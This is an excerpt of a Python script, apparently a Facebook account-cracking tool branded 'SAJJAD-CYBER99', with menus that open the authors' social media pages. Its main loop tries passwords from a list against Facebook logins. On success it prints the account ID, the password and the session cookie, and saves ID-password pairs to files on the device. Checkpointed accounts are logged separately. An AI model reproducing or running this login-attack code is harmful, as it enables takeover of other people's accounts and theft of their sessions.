...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('https://www.facebook.com/Alex.Emran.500')
        FD()
        return None
...
def o():
    ...
    if opt == '1':
        i()
    if opt == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100083302042133.500')
        return None
    if opt == '3':
        os.system('xdg-open https://youtube.com/channel/UCzpqRlRaLASqwsWvsPuCdwQ')
        return None
    if opt == '4':
        os.system('xdg-open https://www.facebook.com/Alex.Emran.500')
        return None
    if None == '0':
        os.system('exit')
        return None
...
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m SAJJAD-CYBER99 
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mCYBER-99-TEAM
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mCYBER 99 TEAM
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.4
\033[1;37m================= \33[32;45mBH-TEAM\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO SAJJAD-CYBER99 TEAM\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(SAJJAD-CYBER99)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/SAJJAD-CYBER99.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(EMRAN-CYBER-CP)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/EMRAN-CYBER-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
